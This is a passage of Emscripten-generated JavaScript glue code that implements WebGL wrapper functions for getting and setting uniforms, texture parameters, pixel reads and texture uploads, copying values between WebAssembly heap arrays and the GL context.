            HEAPF32[params >> 2] = GLctx.getTexParameter(target, pname)
        }
            ;
        var _emscripten_glGetTexParameteriv = (target, pname, params) => {
            if (!params) {
                GL.recordError(1281);
                return
            }
            HEAP32[params >> 2] = GLctx.getTexParameter(target, pname)
        }
            ;
        var _emscripten_glGetTransformFeedbackVarying = (program, index, bufSize, length, size, type, name) => {
            program = GL.programs[program];
            var info = GLctx.getTransformFeedbackVarying(program, index);
            if (!info)
                return;
            if (name && bufSize > 0) {
                var numBytesWrittenExclNull = stringToUTF8(info.name, name, bufSize);
                if (length)
                    HEAP32[length >> 2] = numBytesWrittenExclNull
            } else {
                if (length)
                    HEAP32[length >> 2] = 0
            }
            if (size)
                HEAP32[size >> 2] = info.size;
            if (type)
                HEAP32[type >> 2] = info.type
        }
            ;
        var _emscripten_glGetUniformBlockIndex = (program, uniformBlockName) => GLctx.getUniformBlockIndex(GL.programs[program], UTF8ToString(uniformBlockName));
        var _emscripten_glGetUniformIndices = (program, uniformCount, uniformNames, uniformIndices) => {
            if (!uniformIndices) {
                GL.recordError(1281);
                return
            }
            if (uniformCount > 0 && (uniformNames == 0 || uniformIndices == 0)) {
                GL.recordError(1281);
                return
            }
            program = GL.programs[program];
            var names = [];
            for (var i = 0; i < uniformCount; i++)
                names.push(UTF8ToString(HEAPU32[uniformNames + i * 4 >> 2]));
            var result = GLctx.getUniformIndices(program, names);
            if (!result)
                return;
            var len = result.length;
            for (var i = 0; i < len; i++) {
                HEAP32[uniformIndices + i * 4 >> 2] = result[i]
            }
        }
            ;
        var jstoi_q = str => parseInt(str);
        var webglGetLeftBracePos = name => name.slice(-1) == "]" && name.lastIndexOf("[");
        var webglPrepareUniformLocationsBeforeFirstUse = program => {
            var uniformLocsById = program.uniformLocsById, uniformSizeAndIdsByName = program.uniformSizeAndIdsByName, i, j;
            if (!uniformLocsById) {
                program.uniformLocsById = uniformLocsById = {};
                program.uniformArrayNamesById = {};
                var numActiveUniforms = GLctx.getProgramParameter(program, 35718);
                for (i = 0; i < numActiveUniforms; ++i) {
                    var u = GLctx.getActiveUniform(program, i);
                    var nm = u.name;
                    var sz = u.size;
                    var lb = webglGetLeftBracePos(nm);
                    var arrayName = lb > 0 ? nm.slice(0, lb) : nm;
                    var id = program.uniformIdCounter;
                    program.uniformIdCounter += sz;
                    uniformSizeAndIdsByName[arrayName] = [sz, id];
                    for (j = 0; j < sz; ++j) {
                        uniformLocsById[id] = j;
                        program.uniformArrayNamesById[id++] = arrayName
                    }
                }
            }
        }
            ;
        var _emscripten_glGetUniformLocation = (program, name) => {
            name = UTF8ToString(name);
            if (program = GL.programs[program]) {
                webglPrepareUniformLocationsBeforeFirstUse(program);
                var uniformLocsById = program.uniformLocsById;
                var arrayIndex = 0;
                var uniformBaseName = name;
                var leftBrace = webglGetLeftBracePos(name);
                if (leftBrace > 0) {
                    arrayIndex = jstoi_q(name.slice(leftBrace + 1)) >>> 0;
                    uniformBaseName = name.slice(0, leftBrace)
                }
                var sizeAndId = program.uniformSizeAndIdsByName[uniformBaseName];
                if (sizeAndId && arrayIndex < sizeAndId[0]) {
                    arrayIndex += sizeAndId[1];
                    if (uniformLocsById[arrayIndex] = uniformLocsById[arrayIndex] || GLctx.getUniformLocation(program, name)) {
                        return arrayIndex
                    }
                }
            } else {
                GL.recordError(1281)
            }
            return -1
        }
            ;
        var webglGetUniformLocation = location => {
            var p = GLctx.currentProgram;
            if (p) {
                var webglLoc = p.uniformLocsById[location];
                if (typeof webglLoc == "number") {
                    p.uniformLocsById[location] = webglLoc = GLctx.getUniformLocation(p, p.uniformArrayNamesById[location] + (webglLoc > 0 ? `[${webglLoc}]` : ""))
                }
                return webglLoc
            } else {
                GL.recordError(1282)
            }
        }
            ;
        var emscriptenWebGLGetUniform = (program, location, params, type) => {
            if (!params) {
                GL.recordError(1281);
                return
            }
            program = GL.programs[program];
            webglPrepareUniformLocationsBeforeFirstUse(program);
            var data = GLctx.getUniform(program, webglGetUniformLocation(location));
            if (typeof data == "number" || typeof data == "boolean") {
                switch (type) {
                    case 0:
                        HEAP32[params >> 2] = data;
                        break;
                    case 2:
                        HEAPF32[params >> 2] = data;
                        break
                }
            } else {
                for (var i = 0; i < data.length; i++) {
                    switch (type) {
                        case 0:
                            HEAP32[params + i * 4 >> 2] = data[i];
                            break;
                        case 2:
                            HEAPF32[params + i * 4 >> 2] = data[i];
                            break
                    }
                }
            }
        }
            ;
        var _emscripten_glGetUniformfv = (program, location, params) => {
            emscriptenWebGLGetUniform(program, location, params, 2)
        }
            ;
        var _emscripten_glGetUniformiv = (program, location, params) => {
            emscriptenWebGLGetUniform(program, location, params, 0)
        }
            ;
        var _emscripten_glGetUniformuiv = (program, location, params) => emscriptenWebGLGetUniform(program, location, params, 0);
        var emscriptenWebGLGetVertexAttrib = (index, pname, params, type) => {
            if (!params) {
                GL.recordError(1281);
                return
            }
            var data = GLctx.getVertexAttrib(index, pname);
            if (pname == 34975) {
                HEAP32[params >> 2] = data && data["name"]
            } else if (typeof data == "number" || typeof data == "boolean") {
                switch (type) {
                    case 0:
                        HEAP32[params >> 2] = data;
                        break;
                    case 2:
                        HEAPF32[params >> 2] = data;
                        break;
                    case 5:
                        HEAP32[params >> 2] = Math.fround(data);
                        break
                }
            } else {
                for (var i = 0; i < data.length; i++) {
                    switch (type) {
                        case 0:
                            HEAP32[params + i * 4 >> 2] = data[i];
                            break;
                        case 2:
                            HEAPF32[params + i * 4 >> 2] = data[i];
                            break;
                        case 5:
                            HEAP32[params + i * 4 >> 2] = Math.fround(data[i]);
                            break
                    }
                }
            }
        }
            ;
        var _emscripten_glGetVertexAttribIiv = (index, pname, params) => {
            emscriptenWebGLGetVertexAttrib(index, pname, params, 0)
        }
            ;
        var _glGetVertexAttribIiv = _emscripten_glGetVertexAttribIiv;
        var _emscripten_glGetVertexAttribIuiv = _glGetVertexAttribIiv;
        var _emscripten_glGetVertexAttribPointerv = (index, pname, pointer) => {
            if (!pointer) {
                GL.recordError(1281);
                return
            }
            HEAP32[pointer >> 2] = GLctx.getVertexAttribOffset(index, pname)
        }
            ;
        var _emscripten_glGetVertexAttribfv = (index, pname, params) => {
            emscriptenWebGLGetVertexAttrib(index, pname, params, 2)
        }
            ;
        var _emscripten_glGetVertexAttribiv = (index, pname, params) => {
            emscriptenWebGLGetVertexAttrib(index, pname, params, 5)
        }
            ;
        var _emscripten_glHint = (x0, x1) => GLctx.hint(x0, x1);
        var _emscripten_glInvalidateFramebuffer = (target, numAttachments, attachments) => {
            var list = tempFixedLengthArray[numAttachments];
            for (var i = 0; i < numAttachments; i++) {
                list[i] = HEAP32[attachments + i * 4 >> 2]
            }
            GLctx.invalidateFramebuffer(target, list)
        }
            ;
        var _emscripten_glInvalidateSubFramebuffer = (target, numAttachments, attachments, x, y, width, height) => {
            var list = tempFixedLengthArray[numAttachments];
            for (var i = 0; i < numAttachments; i++) {
                list[i] = HEAP32[attachments + i * 4 >> 2]
            }
            GLctx.invalidateSubFramebuffer(target, list, x, y, width, height)
        }
            ;
        var _emscripten_glIsBuffer = buffer => {
            var b = GL.buffers[buffer];
            if (!b)
                return 0;
            return GLctx.isBuffer(b)
        }
            ;
        var _emscripten_glIsEnabled = x0 => GLctx.isEnabled(x0);
        var _emscripten_glIsFramebuffer = framebuffer => {
            var fb = GL.framebuffers[framebuffer];
            if (!fb)
                return 0;
            return GLctx.isFramebuffer(fb)
        }
            ;
        var _emscripten_glIsProgram = program => {
            program = GL.programs[program];
            if (!program)
                return 0;
            return GLctx.isProgram(program)
        }
            ;
        var _emscripten_glIsQuery = id => {
            var query = GL.queries[id];
            if (!query)
                return 0;
            return GLctx.isQuery(query)
        }
            ;
        var _emscripten_glIsQueryEXT = id => {
            var query = GL.queries[id];
            if (!query)
                return 0;
            return GLctx.disjointTimerQueryExt["isQueryEXT"](query)
        }
            ;
        var _emscripten_glIsRenderbuffer = renderbuffer => {
            var rb = GL.renderbuffers[renderbuffer];
            if (!rb)
                return 0;
            return GLctx.isRenderbuffer(rb)
        }
            ;
        var _emscripten_glIsSampler = id => {
            var sampler = GL.samplers[id];
            if (!sampler)
                return 0;
            return GLctx.isSampler(sampler)
        }
            ;
        var _emscripten_glIsShader = shader => {
            var s = GL.shaders[shader];
            if (!s)
                return 0;
            return GLctx.isShader(s)
        }
            ;
        var _emscripten_glIsSync = sync => GLctx.isSync(GL.syncs[sync]);
        var _emscripten_glIsTexture = id => {
            var texture = GL.textures[id];
            if (!texture)
                return 0;
            return GLctx.isTexture(texture)
        }
            ;
        var _emscripten_glIsTransformFeedback = id => GLctx.isTransformFeedback(GL.transformFeedbacks[id]);
        var _emscripten_glIsVertexArray = array => {
            var vao = GL.vaos[array];
            if (!vao)
                return 0;
            return GLctx.isVertexArray(vao)
        }
            ;
        var _glIsVertexArray = _emscripten_glIsVertexArray;
        var _emscripten_glIsVertexArrayOES = _glIsVertexArray;
        var _emscripten_glLineWidth = x0 => GLctx.lineWidth(x0);
        var _emscripten_glLinkProgram = program => {
            program = GL.programs[program];
            GLctx.linkProgram(program);
            program.uniformLocsById = 0;
            program.uniformSizeAndIdsByName = {}
        }
            ;
        var _emscripten_glPauseTransformFeedback = () => GLctx.pauseTransformFeedback();
        var _emscripten_glPixelStorei = (pname, param) => {
            if (pname == 3317) {
                GL.unpackAlignment = param
            } else if (pname == 3314) {
                GL.unpackRowLength = param
            }
            GLctx.pixelStorei(pname, param)
        }
            ;
        var _emscripten_glPolygonModeWEBGL = (face, mode) => {
            GLctx.webglPolygonMode["polygonModeWEBGL"](face, mode)
        }
            ;
        var _emscripten_glPolygonOffset = (x0, x1) => GLctx.polygonOffset(x0, x1);
        var _emscripten_glPolygonOffsetClampEXT = (factor, units, clamp) => {
            GLctx.extPolygonOffsetClamp["polygonOffsetClampEXT"](factor, units, clamp)
        }
            ;
        var _emscripten_glProgramBinary = (program, binaryFormat, binary, length) => {
            GL.recordError(1280)
        }
            ;
        var _emscripten_glProgramParameteri = (program, pname, value) => {
            GL.recordError(1280)
        }
            ;
        var _emscripten_glQueryCounterEXT = (id, target) => {
            GLctx.disjointTimerQueryExt["queryCounterEXT"](GL.queries[id], target)
        }
            ;
        var _emscripten_glReadBuffer = x0 => GLctx.readBuffer(x0);
        var computeUnpackAlignedImageSize = (width, height, sizePerPixel) => {
            function roundedToNextMultipleOf(x, y) {
                return x + y - 1 & -y
            }
            var plainRowSize = (GL.unpackRowLength || width) * sizePerPixel;
            var alignedRowSize = roundedToNextMultipleOf(plainRowSize, GL.unpackAlignment);
            return height * alignedRowSize
        }
            ;
        var colorChannelsInGlTextureFormat = format => {
            var colorChannels = {
                5: 3,
                6: 4,
                8: 2,
                29502: 3,
                29504: 4,
                26917: 2,
                26918: 2,
                29846: 3,
                29847: 4
            };
            return colorChannels[format - 6402] || 1
        }
            ;
        var heapObjectForWebGLType = type => {
            type -= 5120;
            if (type == 0)
                return HEAP8;
            if (type == 1)
                return HEAPU8;
            if (type == 2)
                return HEAP16;
            if (type == 4)
                return HEAP32;
            if (type == 6)
                return HEAPF32;
            if (type == 5 || type == 28922 || type == 28520 || type == 30779 || type == 30782)
                return HEAPU32;
            return HEAPU16
        }
            ;
        var toTypedArrayIndex = (pointer, heap) => pointer >>> 31 - Math.clz32(heap.BYTES_PER_ELEMENT);
        var emscriptenWebGLGetTexPixelData = (type, format, width, height, pixels, internalFormat) => {
            var heap = heapObjectForWebGLType(type);
            var sizePerPixel = colorChannelsInGlTextureFormat(format) * heap.BYTES_PER_ELEMENT;
            var bytes = computeUnpackAlignedImageSize(width, height, sizePerPixel);
            return heap.subarray(toTypedArrayIndex(pixels, heap), toTypedArrayIndex(pixels + bytes, heap))
        }
            ;
        var _emscripten_glReadPixels = (x, y, width, height, format, type, pixels) => {
            if (GL.currentContext.version >= 2) {
                if (GLctx.currentPixelPackBufferBinding) {
                    GLctx.readPixels(x, y, width, height, format, type, pixels);
                    return
                }
                var heap = heapObjectForWebGLType(type);
                var target = toTypedArrayIndex(pixels, heap);
                GLctx.readPixels(x, y, width, height, format, type, heap, target);
                return
            }
            var pixelData = emscriptenWebGLGetTexPixelData(type, format, width, height, pixels, format);
            if (!pixelData) {
                GL.recordError(1280);
                return
            }
            GLctx.readPixels(x, y, width, height, format, type, pixelData)
        }
            ;
        var _emscripten_glReleaseShaderCompiler = () => { }
            ;
        var _emscripten_glRenderbufferStorage = (x0, x1, x2, x3) => GLctx.renderbufferStorage(x0, x1, x2, x3);
        var _emscripten_glRenderbufferStorageMultisample = (x0, x1, x2, x3, x4) => GLctx.renderbufferStorageMultisample(x0, x1, x2, x3, x4);
        var _emscripten_glResumeTransformFeedback = () => GLctx.resumeTransformFeedback();
        var _emscripten_glSampleCoverage = (value, invert) => {
            GLctx.sampleCoverage(value, !!invert)
        }
            ;
        var _emscripten_glSamplerParameterf = (sampler, pname, param) => {
            GLctx.samplerParameterf(GL.samplers[sampler], pname, param)
        }
            ;
        var _emscripten_glSamplerParameterfv = (sampler, pname, params) => {
            var param = HEAPF32[params >> 2];
            GLctx.samplerParameterf(GL.samplers[sampler], pname, param)
        }
            ;
        var _emscripten_glSamplerParameteri = (sampler, pname, param) => {
            GLctx.samplerParameteri(GL.samplers[sampler], pname, param)
        }
            ;
        var _emscripten_glSamplerParameteriv = (sampler, pname, params) => {
            var param = HEAP32[params >> 2];
            GLctx.samplerParameteri(GL.samplers[sampler], pname, param)
        }
            ;
        var _emscripten_glScissor = (x0, x1, x2, x3) => GLctx.scissor(x0, x1, x2, x3);
        var _emscripten_glShaderBinary = (count, shaders, binaryformat, binary, length) => {
            GL.recordError(1280)
        }
            ;
        var _emscripten_glShaderSource = (shader, count, string, length) => {
            var source = GL.getSource(shader, count, string, length);
            GLctx.shaderSource(GL.shaders[shader], source)
        }
            ;
        var _emscripten_glStencilFunc = (x0, x1, x2) => GLctx.stencilFunc(x0, x1, x2);
        var _emscripten_glStencilFuncSeparate = (x0, x1, x2, x3) => GLctx.stencilFuncSeparate(x0, x1, x2, x3);
        var _emscripten_glStencilMask = x0 => GLctx.stencilMask(x0);
        var _emscripten_glStencilMaskSeparate = (x0, x1) => GLctx.stencilMaskSeparate(x0, x1);
        var _emscripten_glStencilOp = (x0, x1, x2) => GLctx.stencilOp(x0, x1, x2);
        var _emscripten_glStencilOpSeparate = (x0, x1, x2, x3) => GLctx.stencilOpSeparate(x0, x1, x2, x3);
        var _emscripten_glTexImage2D = (target, level, internalFormat, width, height, border, format, type, pixels) => {
            if (GL.currentContext.version >= 2) {
                if (GLctx.currentPixelUnpackBufferBinding) {
                    GLctx.texImage2D(target, level, internalFormat, width, height, border, format, type, pixels);
                    return
                }
                if (pixels) {
                    var heap = heapObjectForWebGLType(type);
                    var index = toTypedArrayIndex(pixels, heap);
                    GLctx.texImage2D(target, level, internalFormat, width, height, border, format, type, heap, index);
                    return
                }
            }
            var pixelData = pixels ? emscriptenWebGLGetTexPixelData(type, format, width, height, pixels, internalFormat) : null;
            GLctx.texImage2D(target, level, internalFormat, width, height, border, format, type, pixelData)
        }
            ;
        var _emscripten_glTexImage3D = (target, level, internalFormat, width, height, depth, border, format, type, pixels) => {
            if (GLctx.currentPixelUnpackBufferBinding) {
                GLctx.texImage3D(target, level, internalFormat, width, height, depth, border, format, type, pixels)
            } else if (pixels) {
                var heap = heapObjectForWebGLType(type);
                GLctx.texImage3D(target, level, internalFormat, width, height, depth, border, format, type, heap, toTypedArrayIndex(pixels, heap))
            } else {
                GLctx.texImage3D(target, level, internalFormat, width, height, depth, border, format, type, null)
            }
        }
            ;
        var _emscripten_glTexParameterf = (x0, x1, x2) => GLctx.texParameterf(x0, x1, x2);
        var _emscripten_glTexParameterfv = (target, pname, params) => {
            var param = HEAPF32[params >> 2];
            GLctx.texParameterf(target, pname, param)
        }
            ;
        var _emscripten_glTexParameteri = (x0, x1, x2) => GLctx.texParameteri(x0, x1, x2);
        var _emscripten_glTexParameteriv = (target, pname, params) => {
            var param = HEAP32[params >> 2];
            GLctx.texParameteri(target, pname, param)
        }
            ;
        var _emscripten_glTexStorage2D = (x0, x1, x2, x3, x4) => GLctx.texStorage2D(x0, x1, x2, x3, x4);
        var _emscripten_glTexStorage3D = (x0, x1, x2, x3, x4, x5) => GLctx.texStorage3D(x0, x1, x2, x3, x4, x5);
        var _emscripten_glTexSubImage2D = (target, level, xoffset, yoffset, width, height, format, type, pixels) => {
            if (GL.currentContext.version >= 2) {
                if (GLctx.currentPixelUnpackBufferBinding) {
                    GLctx.texSubImage2D(target, level, xoffset, yoffset, width, height, format, type, pixels);
                    return
                }
                if (pixels) {
                    var heap = heapObjectForWebGLType(type);
                    GLctx.texSubImage2D(target, level, xoffset, yoffset, width, height, format, type, heap, toTypedArrayIndex(pixels, heap));
                    return
                }
            }
            var pixelData = pixels ? emscriptenWebGLGetTexPixelData(type, format, width, height, pixels, 0) : null;
            GLctx.texSubImage2D(target, level, xoffset, yoffset, width, height, format, type, pixelData)
        }
            ;
        var _emscripten_glTexSubImage3D = (target, level, xoffset, yoffset, zoffset, width, height, depth, format, type, pixels) => {
            if (GLctx.currentPixelUnpackBufferBinding) {
                GLctx.texSubImage3D(target, level, xoffset, yoffset, zoffset, width, height, depth, format, type, pixels)
            } else if (pixels) {
                var heap = heapObjectForWebGLType(type);
                GLctx.texSubImage3D(target, level, xoffset, yoffset, zoffset, width, height, depth, format, type, heap, toTypedArrayIndex(pixels, heap))
            } else {
                GLctx.texSubImage3D(target, level, xoffset, yoffset, zoffset, width, height, depth, format, type, null)
            }
        }
            ;
        var _emscripten_glTransformFeedbackVaryings = (program, count, varyings, bufferMode) => {
            program = GL.programs[program];
            var vars = [];
            for (var i = 0; i < count; i++)
                vars.push(UTF8ToString(HEAPU32[varyings + i * 4 >> 2]));
            GLctx.transformFeedbackVaryings(program, vars, bufferMode)
        }
            ;
        var _emscripten_glUniform1f = (location, v0) => {
            GLctx.uniform1f(webglGetUniformLocation(location), v0)
        }
            ;
        var miniTempWebGLFloatBuffers = [];
        var _emscripten_glUniform1fv = (location, count, value) => {
            if (GL.currentContext.version >= 2) {
                count && GLctx.uniform1fv(webglGetUniformLocation(location), HEAPF32, value >> 2, count);
                return
            }
            if (count <= 288) {
                var view = miniTempWebGLFloatBuffers[count];
                for (var i = 0; i < count; ++i) {
                    view[i] = HEAPF32[value + 4 * i >> 2]
                }
            } else {
                var view = HEAPF32.subarray(value >> 2, value + count * 4 >> 2)
            }
            GLctx.uniform1fv(webglGetUniformLocation(location), view)
        }
            ;
        var _emscripten_glUniform1i = (location, v0) => {
            GLctx.uniform1i(webglGetUniformLocation(location), v0)
        }
            ;
        var miniTempWebGLIntBuffers = [];
        var _emscripten_glUniform1iv = (location, count, value) => {
            if (GL.currentContext.version >= 2) {
                count && GLctx.uniform1iv(webglGetUniformLocation(location), HEAP32, value >> 2, count);
                return
            }
            if (count <= 288) {
                var view = miniTempWebGLIntBuffers[count];
                for (var i = 0; i < count; ++i) {
                    view[i] = HEAP32[value + 4 * i >> 2]
                }
            } else {
                var view = HEAP32.subarray(value >> 2, value + count * 4 >> 2)
            }
            GLctx.uniform1iv(webglGetUniformLocation(location), view)
        }
            ;
        var _emscripten_glUniform1ui = (location, v0) => {
            GLctx.uniform1ui(webglGetUniformLocation(location), v0)
        }
            ;
        var _emscripten_glUniform1uiv = (location, count, value) => {
            count && GLctx.uniform1uiv(webglGetUniformLocation(location), HEAPU32, value >> 2, count)
        }
            ;
        var _emscripten_glUniform2f = (location, v0, v1) => {
            GLctx.uniform2f(webglGetUniformLocation(location), v0, v1)
        }
            ;
        var _emscripten_glUniform2fv = (location, count, value) => {
            if (GL.currentContext.version >= 2) {
                count && GLctx.uniform2fv(webglGetUniformLocation(location), HEAPF32, value >> 2, count * 2);
                return
            }
            if (count <= 144) {
                count *= 2;
                var view = miniTempWebGLFloatBuffers[count];
                for (var i = 0; i < count; i += 2) {
                    view[i] = HEAPF32[value + 4 * i >> 2];
                    view[i + 1] = HEAPF32[value + (4 * i + 4) >> 2]
                }
            } else {
                var view = HEAPF32.subarray(value >> 2, value + count * 8 >> 2)
            }
            GLctx.uniform2fv(webglGetUniformLocation(location), view)
        }
            ;
        var _emscripten_glUniform2i = (location, v0, v1) => {
            GLctx.uniform2i(webglGetUniformLocation(location), v0, v1)
        }
            ;
        var _emscripten_glUniform2iv = (location, count, value) => {
            if (GL.currentContext.version >= 2) {
                count && GLctx.uniform2iv(webglGetUniformLocation(location), HEAP32, value >> 2, count * 2);
                return
            }
            if (count <= 144) {
                count *= 2;
                var view = miniTempWebGLIntBuffers[count];
                for (var i = 0; i < count; i += 2) {
                    view[i] = HEAP32[value + 4 * i >> 2];
                    view[i + 1] = HEAP32[value + (4 * i + 4) >> 2]
                }
            } else {
                var view = HEAP32.subarray(value >> 2, value + count * 8 >> 2)
            }
            GLctx.uniform2iv(webglGetUniformLocation(location), view)
        }
            ;
        var _emscripten_glUniform2ui = (location, v0, v1) => {
            GLctx.uniform2ui(webglGetUniformLocation(location), v0, v1)
        }
            ;
        var _emscripten_glUniform2uiv = (location, count, value) => {
            count && GLctx.uniform2uiv(webglGetUniformLocation(location), HEAPU32, value >> 2, count * 2)
        }
            ;
        var _emscripten_glUniform3f = (location, v0, v1, v2) => {
            GLctx.uniform3f(webglGetUniformLocation(location), v0, v1, v2)
        }
            ;
        var _emscripten_glUniform3fv = (location, count, value) => {
            if (GL.currentContext.version >= 2) {
                count && GLctx.uniform3fv(webglGetUniformLocation(location), HEAPF32, value >> 2, count * 3);
                return
            }
            if (count <= 96) {
                count *= 3;
                var view = miniTempWebGLFloatBuffers[count];
                for (var i = 0; i < count; i += 3) {
                    view[i] = HEAPF32[value + 4 * i >> 2];
                    view[i + 1] = HEAPF32[value + (4 * i + 4) >> 2];
                    view[i + 2] = HEAPF32[value + (4 * i + 8) >> 2]
                }
            } else {
                var view = HEAPF32.subarray(value >> 2, value + count * 12 >> 2)
            }
            GLctx.uniform3fv(webglGetUniformLocation(location), view)
        }
            ;
        var _emscripten_glUniform3i = (location, v0, v1, v2) => {
            GLctx.uniform3i(webglGetUniformLocation(location), v0, v1, v2)
        }
            ;
        var _emscripten_glUniform3iv = (location, count, value) => {
            if (GL.currentContext.version >= 2) {
                count && GLctx.uniform3iv(webglGetUniformLocation(location), HEAP32, value >> 2, count * 3);
                return
            }
            if (count <= 96) {
                count *= 3;
                var view = miniTempWebGLIntBuffers[count];
                for (var i = 0; i < count; i += 3) {
                    view[i] = HEAP32[value + 4 * i >> 2];
                    view[i + 1] = HEAP32[value + (4 * i + 4) >> 2];
                    view[i + 2] = HEAP32[value + (4 * i + 8) >> 2]
                }
            } else {
                var view = HEAP32.subarray(value >> 2, value + count * 12 >> 2)
            }
            GLctx.uniform3iv(webglGetUniformLocation(location), view)
        }
            ;
        var _emscripten_glUniform3ui = (location, v0, v1, v2) => {
            GLctx.uniform3ui(webglGetUniformLocation(location), v0, v1, v2)
        }
            ;
        var _emscripten_glUniform3uiv = (location, count, value) => {
            count && GLctx.uniform3uiv(webglGetUniformLocation(location), HEAPU32, value >> 2, count * 3)
        }
            ;
        var _emscripten_glUniform4f = (location, v0, v1, v2, v3) => {
            GLctx.uniform4f(webglGetUniformLocation(location), v0, v1, v2, v3)
        }
            ;
        var _emscripten_glUniform4fv = (location, count, value) => {
            if (GL.currentContext.version >= 2) {
                count && GLctx.uniform4fv(webglGetUniformLocation(location), HEAPF32, value >> 2, count * 4);
                return
            }
            if (count <= 72) {
                var view = miniTempWebGLFloatBuffers[4 * count];
                var heap = HEAPF32;
                value = value >> 2;
                count *= 4;
                for (var i = 0; i < count; i += 4) {
                    var dst = value + i;
                    view[i] = heap[dst];
                    view[i + 1] = heap[dst + 1];
                    view[i + 2] = heap[dst + 2];
                    view[i + 3] = heap[dst + 3]
                }
            } else {
                var view = HEAPF32.subarray(value >> 2, value + count * 16 >> 2)
            }
            GLctx.uniform4fv(webglGetUniformLocation(location), view)
        }
            ;
        var _emscripten_glUniform4i = (location, v0, v1, v2, v3) => {
            GLctx.uniform4i(webglGetUniformLocation(location), v0, v1, v2, v3)
        }
            ;
        var _emscripten_glUniform4iv = (location, count, value) => {
            if (GL.currentContext.version >= 2) {
                count && GLctx.uniform4iv(webglGetUniformLocation(location), HEAP32, value >> 2, count * 4);
                return
            }
            if (count <= 72) {
                count *= 4;
                var view = miniTempWebGLIntBuffers[count];
                for (var i = 0; i < count; i += 4) {
                    view[i] = HEAP32[value + 4 * i >> 2];
                    view[i + 1] = HEAP32[value + (4 * i + 4) >> 2];
                    view[i + 2] = HEAP32[value + (4 * i + 8) >> 2];
                    view[i + 3] = HEAP32[value + (4 * i + 12) >> 2]
                }
            } else {
                var view = HEAP32.subarray(value >> 2, value + count * 16 >> 2)
            }
            GLctx.uniform4iv(webglGetUniformLocation(location), view)
        }
            ;
        var _emscripten_glUniform4ui = (location, v0, v1, v2, v3) => {
            GLctx.uniform4ui(webglGetUniformLocation(location), v0, v1, v2, v3)
        }
            ;
        var _emscripten_glUniform4uiv = (location, count, value) => {
            count && GLctx.uniform4uiv(webglGetUniformLocation(location), HEAPU32, value >> 2, count * 4)
        }
            ;
        var _emscripten_glUniformBlockBinding = (program, uniformBlockIndex, uniformBlockBinding) => {
            program = GL.programs[program];
            GLctx.uniformBlockBinding(program, uniformBlockIndex, uniformBlockBinding)
        }
            ;
        var _emscripten_glUniformMatrix2fv = (location, count, transpose, value) => {
            if (GL.currentContext.version >= 2) {
                count && GLctx.uniformMatrix2fv(webglGetUniformLocation(location), !!transpose, HEAPF32, value >> 2, count * 4);
                return
            }
            if (count <= 72) {
                count *= 4;
                var view = miniTempWebGLFloatBuffers[count];
                for (var i = 0; i < count; i += 4) {
                    view[i] = HEAPF32[value + 4 * i >> 2];
                    view[i + 1] = HEAPF32[value + (4 * i + 4) >> 2];
                    view[i + 2] = HEAPF32[value + (4 * i + 8) >> 2];
                    view[i + 3] = HEAPF32[value + (4 * i + 12) >> 2]
                }
            } else {
                var view = HEAPF32.subarray(value >> 2, value + count * 16 >> 2)
            }
            GLctx.uniformMatrix2fv(webglGetUniformLocation(location), !!transpose, view)
        }
            ;
        var _emscripten_glUniformMatrix2x3fv = (location, count, transpose, value) => {
            count && GLctx.uniformMatrix2x3fv(webglGetUniformLocation(location), !!transpose, HEAPF32, value >> 2, count * 6)
        }
            ;
        var _emscripten_glUniformMatrix2x4fv = (location, count, transpose, value) => {
            count && GLctx.uniformMatrix2x4fv(webglGetUniformLocation(location), !!transpose, HEAPF32, value >> 2, count * 8)
        }
            ;
        var _emscripten_glUniformMatrix3fv = (location, count, transpose, value) => {
            if (GL.currentContext.version >= 2) {
                count && GLctx.uniformMatrix3fv(webglGetUniformLocation(location), !!transpose, HEAPF32, value >> 2, count * 9);
                return
            }
            if (count <= 32) {
                count *= 9;
                var view = miniTempWebGLFloatBuffers[count];
                for (var i = 0; i < count; i += 9) {
                    view[i] = HEAPF32[value + 4 * i >> 2];
                    view[i + 1] = HEAPF32[value + (4 * i + 4) >> 2];
                    view[i + 2] = HEAPF32[value + (4 * i + 8) >> 2];
                    view[i + 3] = HEAPF32[value + (4 * i + 12) >> 2];
                    view[i + 4] = HEAPF32[value + (4 * i + 16) >> 2];
                    view[i + 5] = HEAPF32[value + (4 * i + 20) >> 2];
                    view[i + 6] = HEAPF32[value + (4 * i + 24) >> 2];
                    view[i + 7] = HEAPF32[value + (4 * i + 28) >> 2];
                    view[i + 8] = HEAPF32[value + (4 * i + 32) >> 2]
                }
            } else {
                var view = HEAPF32.subarray(value >> 2, value + count * 36 >> 2)
            }
            GLctx.uniformMatrix3fv(webglGetUniformLocation(location), !!transpose, view)
        }
            ;
        var _emscripten_glUniformMatrix3x2fv = (location, count, transpose, value) => {
            count && GLctx.uniformMatrix3x2fv(webglGetUniformLocation(location), !!transpose, HEAPF32, value >> 2, count * 6)
        }
            ;
        var _emscripten_glUniformMatrix3x4fv = (location, count, transpose, value) => {
            count && GLctx.uniformMatrix3x4fv(webglGetUniformLocation(location), !!transpose, HEAPF32, value >> 2, count * 12)
        }
            ;
        var _emscripten_glUniformMatrix4fv = (location, count, transpose, value) => {
            if (GL.currentContext.version >= 2) {
                count && GLctx.uniformMatrix4fv(webglGetUniformLocation(location), !!transpose, HEAPF32, value >> 2, count * 16);
                return
            }
            if (count <= 18) {
                var view = miniTempWebGLFloatBuffers[16 * count];
                var heap = HEAPF32;
                value = value >> 2;
                count *= 16;
                for (var i = 0; i < count; i += 16) {
                    var dst = value + i;
                    view[i] = heap[dst];
                    view[i + 1] = heap[dst + 1];
                    view[i + 2] = heap[dst + 2];
                    view[i + 3] = heap[dst + 3];
                    view[i + 4] = heap[dst + 4];
                    view[i + 5] = heap[dst + 5];
                    view[i + 6] = heap[dst + 6];
                    view[i + 7] = heap[dst + 7];
                    view[i + 8] = heap[dst + 8];
                    view[i + 9] = heap[dst + 9];
                    view[i + 10] = heap[dst + 10];
                    view[i + 11] = heap[dst + 11];
                    view[i + 12] = heap[dst + 12];
                    view[i + 13] = heap[dst + 13];
                    view[i + 14] = heap[dst + 14];
                    view[i + 15] = heap[dst + 15]
                }
            } else {
                var view = HEAPF32.subarray(value >> 2, value + count * 64 >> 2)
            }
            GLctx.uniformMatrix4fv(webglGetUniformLocation(location), !!transpose, view)
        }
            ;
        var _emscripten_glUniformMatrix4x2fv = (location, count, transpose, value) => {
            count && GLctx.uniformMatrix4x2fv(webglGetUniformLocation(location), !!transpose, HEAPF32, value >> 2, count * 8)
        }
            ;
        var _emscripten_glUniformMatrix4x3fv = (location, count, transpose, value) => {
            count && GLctx.uniformMatrix4x3fv(webglGetUniformLocation(location), !!transpose, HEAPF32, value >> 2, count * 12)
        }
            ;
